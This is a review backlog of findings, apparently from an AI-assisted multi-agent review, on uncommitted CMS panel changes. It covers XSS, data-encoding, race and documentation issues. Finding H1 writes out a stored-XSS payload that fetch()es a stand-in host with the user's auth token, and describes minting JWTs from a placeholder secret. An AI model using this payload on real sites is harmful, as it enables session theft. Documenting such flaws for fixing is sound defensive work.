# Panel-CRUD Review Backlog — 2026-08-01

Findings from a 5-agent adversarial review (4 dimension reviewers + 1 synthesize/verify pass)
of the **uncommitted** `panel-crud` changes. All work is still in the working tree
(HEAD == master, no commits yet). These are noted for later; **nothing here is fixed yet.**

**Synthesizer verdict:** _Not safe to commit as-is — 1 must-fix + several should-fix._

Raw: 11 findings → 10 verified (1 high, 3 medium, 6 low), 1 dropped as a false positive.

---

## 🔴 High

### H1 — Stored-XSS path via panel write endpoints
- **Where:** `backend/Controllers/Panel.Controller.go` (Create/Update, ~L59), render sink at `backend/Services/Page.Service.go:158`, `frontend/src/views/contents.vue` (`v-html`).
- **Problem:** Panel write endpoints persist author-supplied `Source` with no HTML sanitization. Any line containing `<` is emitted verbatim; `ConvertmdToHTML` sets no sanitizer; `contents.vue` injects the result with `v-html`. This diff adds the **first remote write path** into that unsanitized public-render sink. The only gate is a JWT signed with the in-repo placeholder secret `"SecretKey"`, so a token can be minted offline.
- **Failure scenario:** attacker mints a token, `POST /Pages` with `Source: "<script>fetch('//evil/?t='+localStorage.AuthToken)</script>"`; every public visitor of that page executes it → token/session exfiltration.
- **Note:** weak secret + unsanitized render are pre-existing; the diff materially worsens them by wiring in the write path. Fine for local dev; **must be handled before any public deploy.**
- **Fix:** sanitize rendered HTML server-side (`bluemonday` strict policy, or gate raw-HTML passthrough behind a trusted flag); replace the placeholder JWT secret and validate the signing method in the keyfunc; optionally DOMPurify client-side as defense in depth.

---

## 🟠 Medium

### M1 — `UpdatePage` can add/change a menu binding but never remove one
- **Where:** `backend/Controllers/Panel.Controller.go:106`; client side `frontend/src/components/panelComponents/PageEditor.vue:93`.
- **Problem:** when `req.Menu == nil` the handler skips `Upsert` and never calls `DeleteByPageName`. Clearing the menu caption/path in the panel sends `Menu: null`, returns 200, but the stale `Menus` row persists and the page keeps showing in the nav. Only DELETE cascades; UPDATE has no removal path.
- **Fix:** in `UpdatePage`, when `req.Menu == nil` call `MenuService.DeleteByPageName(name)`, or add an explicit unbind path.

### M2 — `save()` reports "Save failed." after a create/update that actually succeeded
- **Where:** `frontend/src/components/panelComponents/PageEditor.vue:112`; `frontend/src/global/panelState.ts:24`.
- **Problem:** after `createPage`/`updatePage` resolves, the same `try` block runs `select()` → `getPageDetail`, whose `.catch` re-throws on **any** error (500/network). That throw is caught by `save()`'s catch → `error.value = "Save failed."` even though the page was created. For the create path `isNew` stays `true` (only cleared inside the failed `select()`), so clicking Save again fires a **duplicate create → 409**.
- **Fix:** move `refresh()`/`select()` (and the dirty/isNew reset) outside the create/update `try`, or wrap them separately; set `state.isNew = false` immediately after the create call resolves.

### M3 — `ToStorage`/`FromStorage` is a non-injective encoding
- **Where:** `backend/Services/Page.Service.go:38` (+ split in `GetPageText`, ~L156).
- **Problem:** maps real newlines to the `/n` delimiter but never escapes a literal `/n` already present in source. Content containing the substring `/n` (e.g. a link to `https://site.com/news`) is corrupted on store, public render, and edit-reload (`/news` → newline + `ews`). The existing round-trip test masks this because its input has no literal `/n`.
- **Fix:** make the encoding injective — escape the escape before replacing newlines and reverse in exact opposite order in `FromStorage` and in `GetPageText`'s split; add a round-trip test whose input contains a literal `/n`.

---

## 🟡 Low

### L1 — Nav fetch race in `contents.vue`
- **Where:** `frontend/src/views/contents.vue:30`.
- **Problem:** the new `watch(() => GetActivePage, name => fetchPage(name))` re-fetches on every nav click with no ordering/cancellation guard. Fast clicks (LongPage then ShortPage) can resolve out of order, leaving content that doesn't match the selection.
- **Fix:** track an incrementing request id / latest requested name; only assign `returnedHTML` for the most recent request.

### L2 — `Panel.service` swallows non-401 errors
- **Where:** `frontend/src/service/Panel.service.ts:32` (`listPages`, `preview`).
- **Problem:** non-401 errors are swallowed, returning `[]` / `''`. A backend 500/down state is indistinguishable from "no pages" / "blank preview" — the operator may recreate pages that still exist.
- **Fix:** surface a load/preview error state (discriminated result or error flag in `panelState`) so the UI can tell "empty" from "failed to load".

### L3 — Create duplicate check is a TOCTOU race with no unique index
- **Where:** `backend/Services/Page.Service.go:107`.
- **Problem:** count-then-insert; two concurrent creates of the same `PageName` (e.g. double-click Save) can both pass the guard and both insert. The `gorm:"unique"` tag is inert for MongoDB and no unique index exists. Low likelihood for a single-admin panel but a real gap.
- **Fix:** create a unique index on `PageName` at startup and map the duplicate-key error to `ErrPageExists`.

### L4 — `dirty` not set on metadata edits
- **Where:** `frontend/src/components/panelComponents/PageEditor.vue:80`.
- **Problem:** `state.dirty` is only set by the textarea's `onInput`. Editing PageName/ViewType/Menu caption/path via `v-model` never marks the editor dirty, so the "unsaved changes" indicator misses pending metadata edits.
- **Fix:** add `@input`/`@change` handlers (or a watch on the bound metadata + menu fields) that set `state.dirty = true`.

### L5 — `CLAUDE.md` still says "no test suite"
- **Where:** `CLAUDE.md:108` (Commands).
- **Problem:** this diff adds the repo's first tests (`backend/Services/Page.Service_test.go`, frontend `panelState.spec.ts` + `Panel.service.spec.ts`), but the Commands section still says "There is no test suite" / "no test files exist yet" / "once suites exist". Violates the repo's same-session-update rule.
- **Fix:** document `go test ./...` (backend) and `npm run test:unit` (frontend Vitest); remove the stale "no test suite" wording.

### L6 — `CLAUDE.md` Purpose still calls the panel "(planned)"
- **Where:** `CLAUDE.md:22` (Purpose).
- **Problem:** Purpose still says the panel is "(planned)" and cross-references WIP scaffolding that this same diff deleted — a dangling reference.
- **Fix:** drop "(planned)"; reference the implemented ControlPanel endpoints / PageEditor instead of the deleted WIP bullet.

---

## Dropped (false positive)
- Spec/plan docs name a `getPage` panel-service method that shipped as `getPageDetail`. Real inaccuracy but it lives in dated (`2026-07-31-*`) point-in-time design records, not living reference docs; the plan's self-review already notes the rename. Not a code defect — dropped as noise.

---

## Suggested triage (from the discussion, not yet decided)
- **Fix now (cheap, clear functional bugs):** M1, M2, plus the two `CLAUDE.md` drifts (L5, L6 — the owner's own same-session rule).
- **Fix soon (touches storage format):** M3.
- **Pre-public-deploy security task:** H1 (JWT secret + `bluemonday`).
- **Optional polish:** L1–L4.

## Branch state
- Branch `panel-crud`, everything uncommitted, `finishing-a-development-branch` menu still pending (merge / PR / keep). Commit is owner-initiated.
- DB: throwaway user `testadmin` / `testpass123` kept for now; test page `NavDemo` (+ menu entry) still in DB from verification.
